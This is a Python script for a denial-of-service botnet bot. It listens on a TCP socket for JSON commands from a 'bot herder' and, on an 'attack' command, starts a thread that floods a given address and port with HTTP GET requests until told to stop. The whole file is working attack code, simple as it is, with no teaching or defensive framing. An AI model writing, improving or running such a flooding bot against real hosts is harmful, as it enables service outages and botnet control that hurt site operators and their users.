#!/usr/bin/env python3

import socket
import argparse
import json
import threading
import requests

class Dos:
    def __init__(self):
        self._targetAddr = ''
        self._targetPort = 0
    
    @property
    def targetAddr(self):
        return self._targetAddr
    
    @targetAddr.setter
    def targetAddr(self, value):
        self._targetAddr = value
    
    @property
    def targetPort(self):
        return self._targetPort
    
    @targetPort.setter
    def targetPort(self, value):
        self._targetPort = value
      
    def stop(self):
        self._running = False

    def run(self):
        url = f'http://{self._targetAddr}:{self._targetPort}'
        self._running = True
        try:
            while self._running:
                requests.get(url)
        except:
            print(f'Host {url} unreachable')

def parse(receive, conn, addrHerder, addressBot, dos):
    try:
        response = ''
        if receive == 'attack':
            response = f'Start attack by bot {addressBot}'
            threading.Thread(target=dos.run, daemon=True).start()
        elif receive == 'stop':
            response = f'Stop attack by bot {addressBot}'
            dos.stop()
        elif receive == 'close':
            response = f'Close connection by bot {addressBot}'
    except:
        print(f'Connection refused by bot herder {addrHerder}!')
    finally:
        conn.send(bytes(response, 'UTF-8'))

def start_listening(address):
    receive = ''
    dos = Dos()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('127.0.0.1', 9999))
        s.listen()
        print('Start listening')
        while receive != 'close':
            conn, addr = s.accept()
            with conn:
                print(f'Connected by {addr}')
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    rec = json.loads(str(data, 'UTF-8'))
                    print(rec)
                    receive = rec['action']
                    dos.targetAddr = rec['targetAddr']
                    dos.targetPort= rec['targetPort']
                    parse(receive, conn, addr, address, dos)

def main():
    parser = argparse.ArgumentParser(allow_abbrev=False)
    parser.add_argument('-a', '--address', help='add IP address', required=True, action='store', type=str, metavar='\b')
    parser.add_argument('-p', '--port', help='add port number', required=True, action='store', type=int, metavar='\b')
    args = parser.parse_args()
    address = (args.address, args.port)
    start_listening(address)
   
if __name__ == '__main__':
    main()
